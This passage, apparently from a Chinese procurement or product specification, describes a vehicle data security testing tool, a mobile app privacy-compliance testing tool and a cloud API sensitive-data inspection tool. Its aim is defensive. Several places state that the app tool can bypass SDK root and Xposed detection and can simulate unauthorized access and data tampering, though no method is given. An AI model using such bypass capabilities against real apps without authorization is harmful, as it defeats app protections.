据安全工具设计了1个高度灵活的网络接口，支持10M/100M/1000M自适应太网口，确保了与各种不同速率的网络环境的兼容性。这个自适应太网口能够根据网络条件自动调整传输速率，从而提供最优的数据传输效率。这种自适应能力对于车辆在不同地区和不同网络环境下的稳定连接至关重要。此外，该工具配置了1路太网口接口，用户可以通过这一个接口连接到局域网或者更广泛的网络中，进行数据交换和远程管理，同时确保了数据传输的安全性和可靠性。这样的设计不仅节省了空间，而且在保持简洁的同时，也提供了强大的网络连接能力。</li><li>车端数据安全工具的设计充分考虑了无线通信的便捷性，因此配备了1路WIFI接口，以满足车辆内部网络的无线连接需求。该接口支持广泛使用的802.11a/b/g/n协议，保证了与多种设备的兼容性，无论是旧设备还是新设备。通过这个WIFI接口，车端数据安全工具可以实现快速的数据传输和交换，便于远程监控和车辆数据的无线更新，强化了车辆系统的灵活性与现代化水平。这种无线连接的能力对于实现车辆内部设备的高效协同工作和提供高级别的用户体验至关重要。</li><li>车端数据安全工具的设计理念是全面保障车载数据的安全性，它提供了一个全方位的数据安全检测框架，涵盖整车、车载终端以及联网汽车业务系统数据的全生命周期。这一框架细致地包括了从数据采集开始，到数据使用、数据存储、数据共享、数据传输，直至数据销毁的每一个环节。在数据采集阶段，工具确保了数据的真实性和完整性；在数据使用中，它监控数据访问并实施访问控制；在数据存储时，工具提供加密保护，防止未授权访问；在数据共享与传输过程中，它通过安全协议保障数据传输的安全性；最后在数据销毁环节，工具确保所有敏感数据得到彻底且安全的删除，以防数据泄露。通过这种全生命周期的安全管理，车端数据安全工具为车辆数据提供了坚固的防护盾，确保了车辆在现代联网环境下的数据安全。</li><li>该工具支持整车数据跨境传输的合规性检测，这是确保数据跨境传输合法性和安全性的重要环节。随着汽车行业的全球化发展，整车数据跨境传输的需求不断增加，同时也带来了数据安全和隐私保护的挑战。通过合规性检测，该工具能够确保数据跨境传输符合相关法律法规和标准的要求，避免因不合规传输导致的法律风险和安全问题。具体而言，该工具将检查数据的收集、处理、存储和传输是否符合隐私政策和数据保护法规的要求，验证数据的完整性和真实性，并确保数据传输过程中使用了适当的加密技术和安全措施。通过这些合规性检测，用户可以确保数据的合法性和安全性，降低因不合规传输带来的风险和损失。</li><li>车端数据安全工具提供了一系列先进的分析检测功能，以确保车辆系统的数据安全。这些功能包括对数据读取、数据篡改、非授权访问和深度内存检测等敏感数据的监控，以及对数据库文件、密钥文件、证书文件、系统固件等关键组件的细致审查。这样的设计使得任何不正当的数据访问或潜在的安全威胁都能被及时识别和应对，从而大大增强了车辆系统对于数据泄露和安全漏洞的防御能力。通过这些全面的分析检测措施，车端数据安全工具为用户提供了强有力的数据保护，确保车辆数据的完整性和机密性得到维护。</li><li>车端数据安全工具在处理数据时提供了极为灵活的编码转换功能，支持常见的编码格式，如base64、Unicode、Hex等。这项功能允许用户根据需要将数据从一种编码格式转换为另一种，以适应不同的应用场景和技术要求。无论是进行数据加密、存储还是传输，这种编码转换能力都是至关重要的，它确保了数据的兼容性和可读性，同时也为数据的安全性和一致性提供了保障。通过这样的转换工具，车端数据安全工具增强了对各种数据处理任务的支持，为车联网生态中的数据交互提供了强有力的技术支撑。</li><li>该工具支持常见可识别的密钥文件相关使用算法，这意味着它可以识别并处理各种常见的密钥文件格式。在汽车行业中，密钥文件用于控制车辆的启动和安全通信等关键功能，因此确保密钥的安全性至关重要。该工具可以识别密钥文件采用的相关算法，并验证密钥文件的完整性和真实性，防止未经授权的访问和篡改。同时，该工具还可以识别和验证证书文件的信息，例如证书的有效期、颁发机构和内容等。这种识别能力有助于确保数据传输和通信的安全性，防止中间人攻击和伪造证书等安全威胁。通过这种全面的密钥和证书管理功能，用户可以更好地保护整车数据的安全性和完整性，提高数据的安全性。</li><li>车端数据安全工具为确保数据在传输过程中的安全性提供了全面的测试功能。它支持对数据传输的真实性、完整性和机密性进行严格的测试，确保每一条传输的数据都是真实未被篡改的，完整无缺失的，并且对于未授权的访问者保持机密。这些测试对于防止中间人攻击、数据泄露和其他安全威胁至关重要。通过这些全面的测试，车端数据安全工具帮助确保了车辆系统与外界通信时的数据安全，为车联网的可靠性和用户的信任度提供了坚实的基础。</li><li>车端数据安全工具提供了细致入微的测试功能，用以确保数据采集过程的合规性和安全性。该工具支持对非授权的数据采集行为进行检测，从而预防未授权用户非法获取数据。同时，它也能够测试数据采集的范围，确保仅收集必要的信息，以符合隐私保护的法律要求。此外，工具还能测试数据采集的周期，以验证数据是否按照既定的时间间隔被正确采集。这些测试功能共同构成了一个强大的监控机制，保障了数据采集的合法性、适当性以及时效性，对于维护车联网系统的数据安全和用户隐私至关重要。</li><li>车端数据安全工具旨在保障数据在存储和使用过程中的机密性，通过专门设计的测试功能确保敏感信息得到妥善保护。该工具支持数据存储/使用的机密性测试，可以有效检测数据在存储过程中是否存在未加密或加密不当的风险，以及在使用时是否有泄露的可能。这种测试对于发现潜在的安全漏洞至关重要，确保所有敏感数据都按照最高安全标准进行加密，并且只对授权用户可用。通过这些机密性测试，车端数据安全工具帮助车辆制造商和使用者确保数据在整个生命周期内的安全性，从而维护用户信任并符合数据保护法规。</li><li>车端数据安全工具提供全面的安全测试功能，特别注重关键数据的保护。它支持对关键数据的读取、篡改和非授权访问等安全性能进行严格的测试。工具能够检查和验证关键数据是否能够被正确地读取，同时保证只有授权的操作才能进行。此外，它还能检测数据是否容易受到篡改的攻击，以及是否有足够的防护措施来防止非授权的访问。通过这些测试，工具帮助确保了车辆系统中最为敏感和重要的数据得到了严格的保护，从而防止了可能导致严重后果的安全事件发生。</li></ol><h4 id="技术实现内容-48"><a href="#技术实现内容-48" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><h5 id="硬件方案-8"><a href="#硬件方案-8" class="headerlink" title="硬件方案"></a>硬件方案</h5><p>机箱：标准上架式机箱</p><p>开关按钮：开/关机按钮1路</p><p>处理器型号：Intel I7，主频1.8GHz</p><p>内存容量：8GB</p><p>硬盘：SSD固态硬盘容量256GB</p><p>网络接口：支持1路10M/100M/1000M自适应太网口接口</p><p>WIFI接口：数量1路，支持802.11a/b/g/n协议</p><h5 id="软件方案-10"><a href="#软件方案-10" class="headerlink" title="软件方案"></a>软件方案</h5><p>前端设计：</p><p>用户界面：设计直观、用户友好的界面，使用户能够方便地进行操作和管理。</p><p>功能模块：将各项功能划分为不同的模块，如样品管理模块、任务管理模块、系统管理模块等。</p><p>数据展示：通过图表、表格等方式展示测试结果和相关数据，以便用户进行分析和评估。</p><p>后端设计：</p><p>服务器端：搭建服务器端，用于处理前端请求、执行相应的测试任务和数据处理。</p><p>数据库：设计数据库用于存储测试对象信息、测试任务信息、测试结果数据等。</p><p>任务管理：实现任务管理功能，包括新增、编辑、删除、搜索、配置用例、开始检测和查看结果等操作。</p><p>测试功能：实现各项测试功能，如数据安全测试、数据加密测试等。</p><p>数据和日志管理：记录和管理测试过程中产生的测试数据和操作日志，以便用户查看和导出。</p><p>安全通信：在安全通信方面，采用SSL的方式进行了加密通信，这是为了保障安全的进行数据传输。</p><p>数据导出和报告：</p><p>数据导出：支持将测试结果数据导出为常见格式，如CSV、Excel等，以便用户进行进一步的数据分析和处理。</p><p>报告生成：根据测试结果自动生成测试报告，包括测试概要、测试结果、修复建议等内容。</p><p>报告导出：支持将测试报告导出为PDF格式，以便用户进行存档、分享和提交给相关方。</p><p>用户权限和安全：</p><p>用户身份验证：实现用户身份验证机制，确保只有授权用户可以访问和使用工具。</p><p>用户权限管理：设置不同的用户权限，限制用户对工具的操作和访问范围。</p><p>安全性考虑：在开发过程中，注重安全性，防止潜在的安全漏洞和攻击。</p><p>扩展性和可维护性：</p><p>扩展性：设计具有良好扩展性的架构，以方便后续添加新的功能模块和测试功能。</p><p>可维护性：采用合适的编程规范和设计模式，使代码易于维护和修改。</p><h5 id="工具功能-10"><a href="#工具功能-10" class="headerlink" title="工具功能"></a>工具功能</h5><p>采集非授权测试：检测数据采集过程中的授权验证机制。</p><p>采集范围和周期测试：验证数据采集的范围和周期是否符合安全要求。</p><p>数据使用安全检测：检测数据在使用过程中的安全性，验证数据使用是否进行授权验证以及数据使用范围是否符合授权范围。</p><p>数据存储机密性检测：对数据存储环节的加密和访问控制进行测试，验证数据是否可被非法获取，验证是否存在数据泄露风险。</p><p>数据共享安全检测：验证数据在共享过程中的安全，测试共享协议和加密措施，数据出境和共享授权检测。</p><p>数据传输安全检测：验证数据在传输过程中的真实性、完整性和机密性保护。</p><p>数据安全销毁检测：确保不再需要的数据能够被安全地销毁，无法恢复。</p><p>深度内存检测：分析内存中的数据残留，检测是否有敏感信息泄露的风险。</p><p>非授权访问测试：模拟攻击场景，检测系统对非授权访问的防护能力。</p><p>数据篡改检测：验证系统对数据篡改行为的检测和防御能力。</p><p>关键文件分析：对系统中的关键文件进行安全性分析，如数据库文件、密钥文件、证书文件和系统固件。</p><p>数据修改：提供数据修改功能，帮助修正潜在的安全风险。</p><p>编码转换：支持对数据进行base64、Unicode、Hex等编码的转换，便于数据的分析和处理。</p><p>密钥文件分析：识别和分析密钥文件的使用算法，检测证书文件的有效性和安全性。</p><p>读取、篡改、非授权测试：对关键数据的安全性进行综合测试，包括数据的读取、篡改和非授权访问等。</p><h3 id="APP隐私合规测试工具"><a href="#APP隐私合规测试工具" class="headerlink" title="APP隐私合规测试工具"></a>APP隐私合规测试工具</h3><p>支持安卓、iOS和linux等平台移动应用隐私合规检测与分析的系统，产品具有操作简单、检测效率高、检测质量可靠和独立部署等特点，为各类移动应用进行全方位和深度的隐私合规检测。</p><h4 id="功能实施方案-56"><a href="#功能实施方案-56" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><p>此款APP隐私合规测试工具包含一个专门设计的安卓APP检测机（安卓系统手机），专为安卓系统手机打造。该检测机能够对APP进行深入的隐私合规性分析和测试。它能够模拟用户操作，监测APP在实际运行中的数据处理行为，确保所有个人信息的处理都符合隐私保护的标准。这样的设备对于开发者来说是极其宝贵的，因为它可以帮助他们确保其APP在上线前满足所有相关的隐私法规要求，降低法律风险。</p><p>此款APP隐私合规测试工具包含一个专门设计的iOS的APP检测机（iOS系统手机），这是一款专为IOS系统手机设计的测试设备。该检测机利用最新的IOS操作系统环境，对苹果手机中的APP进行全面的隐私合规性评估。它通过模拟用户行为，细致地检查APP在IOS平台上的数据访问和处理是否遵守了隐私法规。这一功能对于开发者尤其关键，因为它可以确保他们的应用程序在投放到App Store市场前，已经完全符合苹果公司的隐私政策以及国际隐私法规，从而有效避免违规风险。</p><p>此款APP隐私合规测试工具提供了一项便捷的功能，能够使用已有的账户信息进行登录和登出系统。测试中无需创建新的账号即可直接利用现有的用户名和密码，快速进入系统开始隐私合规性评估。这项功能不仅简化了操作流程，提高了测试效率，还确保了测试过程的连续性和高效性。</p><p>此款APP隐私合规测试工具提供了一项高效的检索功能，使用户能够基于APP的名字进行快速检索。为了进一步优化用户体验，还加入了多维度的筛选条件，包括应用分类、评估状态以及隐私结果等，以便用户根据不同的需求进行精准查找。此外，检索结果严格限定在用户的管理权限范围内，确保只显示那些属于用户账号管理权限下的APP的检测历史和记录。这样的设计既保障了数据的安全性，又提升了工作效率。用户还可以通过简单的点击操作，快速访问到每个APP的详细检测记录，查看具体的隐私合规评估结果和相关的历史数据，从而对APP的隐私合规性有更深入的了解。这个功能的实现，不仅体现了对用户体验的重视，也展示了对数据隐私管理工作的专业和细致。</p><p>此款APP隐私合规测试工具支持支持在Android系统和iOS系统上的APP以及内嵌的第三方SDK进行全面的隐私合规检测，涵盖了各种类型的应用程序和SDK的隐私合规检测，展现了卓越的兼容性和全面性。工具还支持根据APP的类型、适用功能、适用系统和适用政策等进行添加和分析。用户可以根据自己的需求选择相应的APP进行检测，并根据其类型、功能、系统和政策要求进行深入分析。这种灵活性使得用户能够更加精确地评估APP的隐私合规性，并根据不同条件进行定制化的检测和分析。通过这种全面的检测和分析能力，用户可以更好地了解APP的数据收集和处理行为，确保其符合相关法律法规和隐私政策的要求。</p><p>★该工具支持APP隐私合规的全自动化检测，因为不同的应用有不同的检要求，工具能依照应用的不同类型和测试要求进行测试，可按需求对信息获取与出境信息进行检测。在移动应用日益普及的今天，用户对应用的隐私保护要求越来越高，因此对应用的隐私合规性进行全面检测显得尤为重要。该工具通过全自动化检测技术，能够自动获取应用的各种信息并进行深入分析，大大提高了检测的效率和准确性。首先，该工具可以进行信息获取与出境信息检测。在检测过程中，工具会自动获取应用的各种信息，包括应用的功能、数据收集和处理方式等，并对其出境信息进行检测。这种检测能够确保应用在收集、使用和传输用户个人信息时符合相关法律法规和隐私政策的要求。其次，该工具可以对应用获取的个人信息进行检测。通过模拟用户使用场景和操作行为，工具可以检测应用在运行过程中收集的用户个人信息，并对其合规性进行分析。这种检测能够揭示应用是否存在过度收集、滥用或未经用户同意收集个人信息的情况。此外，该工具还可以对应用嵌入的第三方SDK进行检测。许多移动应用都会嵌入第三方软件开发工具包（SDK)，这些SDK可能存在隐私泄露的风险。该工具能够对SDK进行深入分析，检测其是否存在隐私泄露问题，并提供相应的解决方案和改进建议。同时，该工具还可以对应用自身和第三方SDK获取个人信息行为进行检测。通过模拟用户操作和收集应用的各种行为数据，工具能够检测应用在获取个人信息时的行为表现，并对其合规性进行分析。这种检测能够帮助用户了解应用的数据收集和处理行为，确保其符合隐私政策的要求。此外，该工具还具备个人信息出境行为检测、个人信息泄露风险分析、明文存储分析和应用权限信息分析等功能。这些功能进一步扩展了工具的检测范围和深度，能够更加全面地评估应用的隐私合规性。通过这些自动化检测和分析功能，用户可以快速获得准确的检测结果和报告，从而更好地评估应用的隐私合规性。为了保证检测的准确性和权威性，工具的隐私检测协议依据并包含了多个重要的法规和标准，包括《个人信息和重要数据出境安全评估办法》、《App违法违规收集使用个人信息行为认定方法》、《信息安全技术个人信息安全规范》GB/T 35273-2020、《网络安全实践指南-移动互联网应用基本业务功能必要信息规范》TC260-PG-20191A、《常见类型移动互联网应用程序必要个人信息范围规定》、工信部信管函〔2019〕337号和〔2020〕164号文件、《App违法违规收集使用个人信息自评估指南》、《互联网个人信息安全保护指引》，以及《车联网信息服务用户个人信息保护要求(YD 3746-2020)》等。这些协议和标准为此款检测工具提供了坚实的法律和技术基础，确保客户能够信任工具的服务，从而在保护用户隐私的同时，也能够保护他们自己的商业利益。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/e76cb055d6a72d62a2114b4b837b1307.png"></p><p>为确保APP隐私合规性，此款APP隐私合规测试工具专门设计了功能，支持对加密传输的个人信息进行精准的识别和标识。工具能够检测数据传输过程中的加密实施情况，并标识出正在传输的个人信息，确保它们在整个过程中得到适当的加密保护。这项功能对于遵守数据保护法规至关重要，帮助开发者确保他们的应用在用户数据的处理和传输方面符合最新的安全标准和合规要求。</p><p>此款APP隐私合规测试工具不仅仅关注隐私合规性的基本检测，还具备一定的对抗攻防能力，尤其在Android平台下表现突出，它能够绕过第三方SDK对root、xposed等常见检测环境的检测保护，有效模拟攻击者可能采取的手段。这使得开发者能够从攻击者的角度评估应用的安全性，进而采取相应的防护措施，确保应用在面对各种环境和攻击时的数据保护能力。通过这种方式，此款工具帮助提升应用的整体安全防护水平，保障用户个人信息的安全。</p><p>在当今的数字时代，隐私政策的透明度和准确性对于用户信任至关重要。为了加强这一点，此款APP隐私合规测试工具采用了先进的自然语言处理技术，实现了隐私政策的自动化分析。这项技术能够深入解读隐私政策文本，自动提取关键信息，如申明的个人信息类型和所需权限，然后将这些申明与应用的实际行为进行对比分析。工具的分析范围涵盖隐私政策申明信息情况分析、隐私政策中申明的业务功能与个人信息的关联分析、隐私政策与应用收集使用个人信息一致性分析、隐私政策申明的SDK与实际嵌入的SDK对比分析、隐私政策中申明的权限信息分析、隐私政策完整性评估分析以及隐私政策描述不清评估分析。通过这些细致的分析，此款工具不仅帮助开发者识别和解决隐私政策中可能存在的问题，还确保了用户能够获得清晰、准确的隐私信息，从而提升了整个应用的透明度和用户对应用的信任度。</p><p>此款APP隐私合规测试工具进一步提供了应用运行时明示分析和用户权利分析等功能，以支持更深入的人工核验行为分析。这些分析功能可以帮助确保应用在运行时能够透明地告知用户其隐私政策的具体实施情况，包括数据收集与使用的明示，以及用户对自己数据管理所拥有的权利。这样的分析对于评估应用是否在实际操作中尊重用户权利、是否遵循透明的原则至关重要，有助于提升用户对应用的信任，并确保应用符合隐私保护的法律要求。</p><p>为了实现更精准的隐私合规性评估，此款APP隐私合规测试工具设计了一种机制，支持将自动化检测结果与人工检测结果相结合。通过这种方式，工具不仅能够利用自动化技术快速识别潜在的合规性问题，还能够通过人工复核确保检测结果的准确性和可靠性。这种双重检测机制的结合，不仅提高了问题判定的效率和准确度，还能够以更直观的方式展示给用户，使得开发者和审核人员都能清晰地理解和解决隐私合规性问题。这种综合的检测方法是确保APP隐私政策与实际行为一致性的关键，进而保障用户隐私安全。</p><p>此款APP隐私合规测试工具采用多维度的审核策略，确保应用的隐私合规性全面覆盖。该工具集成了使用规则审核、保存规则审核、对外提供规则审核、收集规则审核、明示同意审核、隐私条款状态审核和用户权利审核等多项功能，其中包括评估的内容，评估的方式，评估的结果和审核回放。这些审核功能评估应用是否按照既定的隐私保护规则来使用、保存、提供和收集用户数据，同时确保用户对数据的使用已明示同意，并且隐私条款的状态是最新的，用户的权利得到充分的尊重和保护。评估的内容涵盖了用户数据的每一个处理阶段，评估的方式结合了自动化检测与专业人员的深度分析，以确保结果的全面性和准确性。最终，评估结果将详细展示，以便开发者和合规审核员能够清晰地了解存在的问题，并采取相应的改进措施。此外，该工具还提供审核回放功能，允许用户回顾和分析整个审核过程，这是提高隐私合规水平和透明度的重要手段。</p><p>为了使开发者和合规团队能够快速把握应用隐私合规性的整体状况，此款APP隐私合规测试工具提供了评估结果概况分析功能。该功能能够综合所有审核和检测结果，将潜在的隐私风险分为高、中、低三个等级。这种风险分析帮助团队识别出需要优先解决的关键问题，同时也能够对整体隐私合规性情况进行快速的概览。通过这样的分级，工具不仅简化了复杂的审计数据，还为应对和缓解潜在风险提供了明确的指导。</p><p>此款APP隐私合规测试工具特别强调对重点问题的深入分析，展示重要的隐私合规评估的重要问题，以确保用户数据的安全和隐私得到充分保护。工具中的重点问题分析功能专门设计来突出显示在隐私合规评估中识别出的重要问题。这些问题往往是影响用户隐私权益的关键因素，可能涉及数据处理的不透明、用户同意的不充分或隐私政策的不完整。通过这个功能，合规团队可以直观地看到需要优先解决的问题，并据此制定相应的改进措施。这样的分析不仅帮助应用开发者及时修正潜在的隐私风险，还有助于提高用户对应用隐私保护措施的信任。</p><p>为确保应用严格遵守相关法律法规， APP隐私合规测试工具提供了全面的法律法规分析功能，进行法律法规分析，根据法律法规的内容，评估结果进行全面评估。该功能按照当前有效的法律法规内容，对评估结果进行全面的审查和评估。工具不仅检查应用的操作是否符合隐私政策，还确保这些操作与地区或国家的法律法规保持一致。通过这种方式，工具帮助开发者理解并遵循复杂的法律环境，降低因违规处理用户数据而产生的法律风险，确保应用的隐私合规性不仅停留在表面，而是深入到法律层面的合规要求。</p><p>APP隐私合规测试工具不仅专注于当前的合规状况，而且提供了一个全方位的历史变化展示功能。这一功能能够追踪和展示应用在不同检测批次或版本间的合规性变化，从而让开发者清晰地看到随时间推移应用隐私合规性的演变。此外，工具还能展示不合规业务类型的占比展示，让开发者了解哪些业务领域最需要关注和改进。应用不合规率展示功能则直观地显示了应用在隐私合规方面的整体表现，而应用违规问题展示则更加具体地列出了应用存在的各项违规事项。最后，热度排行功能提供了一个行业内的隐私合规热度对比，帮助开发者理解在隐私合规方面，公众和监管机构最关注的问题是什么。这些功能共同作用，为开发者提供了一个多维度的合规性分析工具，对于不同检测批次或者版本的应用进行合规情况比对，该功能能够给出应用不同版间存在的差异性对比结果，不仅能够辅助开发者识别和解决当前的隐私问题，还能够帮助他们预防未来可能出现的合规风险。</p><p>为了便于开发者进行详细的分析和记录保持，APP隐私合规测试工具提供了报告导出功能。通过这个功能，用户可以将检测到的APP隐私合规情况生成报告，并导出到本地。这样，开发者可以在需要时轻松地访问和分享这些报告，无论是用于内部审查、团队协作还是作为合规性证明文件。导出的报告详细记录了APP的隐私合规测试结果，为后续的合规工作提供了便捷的参考资料。</p><p>APP隐私合规测试工具不仅使得隐私政策的合规性评估变得简单，还提供了额外的便利性，支持用户直接从平台下载隐私政策。这一功能包括两个方面：一是允许用户下载APP的现行隐私政策文档，便于进行详细审查和存档；二是提供了一系列的隐私政策模板下载服务，帮助那些需要制定或更新隐私政策的开发者快速得到符合行业标准的参考文本。这些模板覆盖了多种典型场景，经过法律专家的审查，以确保它们的合规性和有效性，从而为开发者节省时间，降低制定合规隐私政策的复杂性。</p><p>本APP隐私合规测试工具不仅提供自动化的检测报告，还特别支持人工辅助的解读服务。当工具产出检测报告后，专业的隐私合规分析师会对报告进行详细解读，帮助用户深入理解其中的内容。此外，结合解读出的隐私合规问题痛点，分析师们还将提供针对性的修复建议。这些补充建议旨在指导用户如何改进其APP，以满足隐私合规的要求，确保用户在隐私保护方面的努力能够得到最有效的指导和支持。</p><p>为APP隐私合规测试工具提供了软件license，确保数据库可以确保3年内用户将享受到软件本身以及其背后数据库的免费升级服务。在这段时间内，无论软件功能如何增强或数据库如何扩展，用户都将无需支付额外费用即可获得最新版本。这样的服务保证了用户的APP隐私合规测试工具始终处于行业先进水平，帮助用户适应快速变化的隐私法规环境，无需担忧额外的升级成本。</p><h4 id="技术实现内容-49"><a href="#技术实现内容-49" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><h5 id="硬件方案-9"><a href="#硬件方案-9" class="headerlink" title="硬件方案"></a>硬件方案</h5><p>硬件配置：</p><p>配置一台高性能服务器，具备足够的计算能力和存储空间来运行测试工具和存储相关数据，用来运行APP隐私合规测试工具。同时搭配iOS和Android两种不同的检测机，完成APP的动态监测。</p><p>配置：8核心CPU、16GB内存、1TB硬盘空间。</p><p>服务器操作系统：可根据需求选择适合的操作系统，如Linux或Windows Server。</p><p>安卓APP检测机：谷歌原生系统手机，256GB存储空间能够访问root权限以便更深入的系统级检测。配备高性能处理器和足够的内存，以保证检测工具的流畅运行。。</p><p>苹果APP检测机：最新版本iOS系统手机，256GB存储空间。</p><h5 id="软件方案-11"><a href="#软件方案-11" class="headerlink" title="软件方案"></a>软件方案</h5><p>软件参数将包含以下模块：</p><p>1.用户管理：</p><p>用户管理系统是隐私合规测试工具的核心组成部分，它负责用户的认证、授权、信息管理和安全性维护。该系统允许用户通过用户名和密码进行登录，并通过多因素认证增强安全性。登录后，用户能够根据其角色和权限查看和操作特定的数据和工具功能。</p><p>用户管理系统具有严格的安全措施，包括密码加密存储、会话管理以及自动注销机制。用户活动将被记录在审计日志中，以便于跟踪和回溯操作。</p><p>2.数据检索和管理：</p><p>数据检索和管理系统提供一个直观的界面，用户可以通过多种筛选条件（如APP名称、分类、评估状态、隐私结果）快速定位所需的APP检测记录。系统支持复杂查询，并提供实时搜索结果，优化用户体验。</p><p>系统确保数据的完整性和一致性，通过定期备份和同步机制，防止数据丢失或损坏。对于数据的修改和删除操作，系统将要求二次确认，并记录详细的操作日志。</p><p>3.检测引擎：</p><p>检测引擎是该工具的核心，它将负责执行各种隐私合规性检测任务。引擎支持批量检测，自动化执行数据收集、个人信息使用、SDK分析等任务，并将结果记录下来。检测引擎能够处理大量的数据，并且能够快速适应新的检测需求。</p><p>引擎集成机器学习和自然语言处理技术，用于分析隐私政策文本，并与APP的实际数据收集行为进行对比，以评估其一致性。</p><p>4.安全和对抗措施：</p><p>安全性是隐私合规测试工具的一个重要方面。工具采用行业标准的加密技术来保护数据传输和存储。此外，对于在Android平台下的检测，工具具备绕过第三方SDK检测环境的能力，如root检测、xposed框架检测等。</p><p>对抗措施包括定期的安全审计和渗透测试，确保检测工具能够抵御最新的网络威胁。</p><h5 id="工具功能-11"><a href="#工具功能-11" class="headerlink" title="工具功能"></a>工具功能</h5><p>工具包含以下检测功能</p><p>1.自动化检测功能</p><p>自动化检测功能提供无人值守的隐私合规性评估，涵盖个人信息的获取、使用、存储、传输和泄露风险。工具将自动执行流程，从模拟用户操作到监测后台数据流，再到分析权限使用情况。它将针对每个检测项生成详细的报告，包括潜在的风险和违规行为。</p><p>自动化检测功能能够识别APP中嵌入的第三方SDK，并评估这些SDK对个人信息的处理是否符合法规要求。对于个人信息的加密传输，工具将自动识别加密协议和实施情况，确保数据在传输过程中的安全。</p><p>2.隐私政策分析</p><p>隐私政策分析是工具的另一个关键功能，它将使用自然语言处理技术来解析隐私政策文档，提取关键信息，并将这些信息与APP的实际行为进行比较。分析结果将包括隐私政策的完整性评估、描述清晰度评估，以及政策与实践之间的一致性评估。</p><p>《App违法违规收集使用个人信息行为认定方法》</p><p>《常见类型移动互联网应用程序必要个人信息范围规定》</p><p>工信部信管函〔2019〕337号</p><p>工信部信管函〔2020〕164号</p><p>《信息安全技术 个人信息安全规范》 GB/T 35273-2020</p><p>《App违法违规收集使用个人信息自评估指南》</p><p>《个人信息和重要数据出境安全评估办法》</p><p>《互联网个人信息 安全保护指引》</p><p>《网络安全实践指南-移动互联网应用基本业务功能必要信息规范》 TC260-PG- 20191A</p><p>《车联网信息服务用户个人信息保护要求(YD 3746-2020)》</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/e76cb055d6a72d62a2114b4b837b1307.png"></p><p>该功能将进一步支持隐私政策中声明的权限信息分析，确保APP声明的数据收集权限与其实际使用的权限相符。如果发现不一致，工具将标记出潜在的违规风险。</p><p>3.规则审核与结果展示：</p><p>规则审核功能允许用户对隐私合规检测的规则进行审核和管理。用户可以创建、保存和分享审核规则，以及对规则进行分类和标记。工具将提供一个规则审核的历史记录，包括每次审核的详细信息和结果。</p><p>检测结果的展示结合自动化和人工检测结果，提供一个直观的仪表板，展示APP的合规性评估结果。工具将支持风险级别的可视化展示，包括高、中、低风险的区分，以及不同风险等级下的问题分析。</p><p>4.法律法规和历史趋势分析</p><p>法律法规分析功能将根据最新的法律法规内容，对APP的合规性进行全面评估。工具将提供一个更新机制，确保所有的法规分析都是基于最新的法律文本。</p><p>历史趋势分析将帮助用户了解APP隐私合规性的变化情况。工具将展示不同检测批次或版本间的合规情况比对，以及不合规业务类型的占比和热度排行。这将帮助用户识别隐私合规性的改进点和潜在的风险点。</p><p>5.报告和隐私政策支持</p><p>报告功能将允许用户导出检测结果，以PDF或其他格式提供详细的合规性评估报告。工具还将支持隐私政策的下载，包括标准模板的下载，帮助APP开发者编写和完善自己的隐私政策。</p><p>6.人工解读与修复建议</p><p>为了弥补自动化检测的局限性，工具将提供人工解读服务。专业的隐私合规分析师将根据自动化检测的结果，进行深入分析，识别问题的根源，并提供针对性的修复建议。这将确保APP开发者不仅了解自己的合规性问题，而且能够采取有效的措施进行改进。</p><h3 id="云端数据检查工具"><a href="#云端数据检查工具" class="headerlink" title="云端数据检查工具"></a>云端数据检查工具</h3><p>通过技术手段对API 访问的数据进行持续监测评估，自动梳理API 接口中的敏感数据流并生成 API 接口与敏感数据映射，确保个人隐私数据、商业数据以及其他敏感数据进行持续监控。</p><p>通过识别各种类型的API，对API的传输内容进行还原、对其传输内容进行精细化检测来达到“谁通过什么方式的API，传输了什么类型的敏感数据”的检测效果，实现敏感信息流转可视化。</p><h4 id="功能实施方案-57"><a href="#功能实施方案-57" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><ol><li>云端数据检查工具在设计时充分考虑了高性能需求，能够保证在网络条件优越的情况下，达到最大4Gbps的数据吞吐量。这一显著的性能指标意味着即使是数据量巨大的企业也能够利用这一工具快速、高效地进行数据检查和处理。无论是进行数据迁移、备份还是其他需要大量数据传输的场景，这一工具都能够提供强大的支持，确保数据流动的高效和稳定，大幅提升工作效率，减少等待时间。</li><li>云端数据检查工具配备了先进的系统内置API识别规则，这些规则能够自动发现并识别各种API资产，提供了全面的支持以覆盖多种API类型。具体来说，该工具能够自动识别包括Restful、GraphQL、websocket、MQTT、gRPC、JSON-RPC、XML-RPC在内的多种API格式。除此之外，工具还具备强大的自动聚类功能，可以对识别出的API进行智能分类和汇聚。这样的设计大大简化了API管理流程，允许用户能够更加高效地组织和监控其API资产，从而提升整个系统的运行效率和数据安全性。</li><li>云端数据检查工具提供了一个直观的用户界面，其中系统支持以列表形式展示API、API所属的应用和API的类型等关键数据点。这种展示方式让用户能够一目了然地看到所有API的详细信息，从而更加便捷地进行管理和监控。此外，为了满足不同用户的需求，工具还支持两种不同的视角查看API资产信息：用户可以选择以主机为单位查看，了解每个主机上的API情况；也可以从业务应用的角度进行查看，这样有助于用户理解每个业务应用中API的使用情况。这种灵活的查看方式为用户提供了全面的信息视图，帮助他们更好地做出决策。</li><li>云端数据检查工具内置了一套全面的API识别规则，这些规则涵盖了当前市场上广泛使用的各种API类型，包括但不限于Restful、GraphQL、websocket、MQTT、gRPC、JSON-RPC、XML-RPC等。这使得工具能够自动识别和适应多样化的API架构，增强了其对不同API的检查能力。为了保持工具的时效性和前瞻性，系统还支持通过升级规则库的方式来更新API识别规则。随着API技术的发展和新API类型的出现，用户可以轻松更新工具的规则库，确保数据检查工具始终能够与时俱进，有效应对新的API识别需求。</li><li>云端数据检查工具不仅提供了丰富的内置API识别规则，还支持用户通过自定义方式来设置API识别规则。这一功能的加入极大地提升了工具的灵活性和适用性。用户可以根据自己的具体需求，通过字符串匹配或者更为复杂的正则表达式来定义API的识别规则。这样的设计使得工具能够精确地识别和匹配用户特定的API模式，无论是非标准的API设计，还是特殊的业务场景下的API调用，用户都可以通过这一自定义功能来确保数据检查工具的高效和准确性。</li><li>云端数据检查工具在用户界面上提供了一个直观的列表，用以分类和展示各个API的风险等级，帮助用户快速识别潜在的安全隐患。这个列表不仅根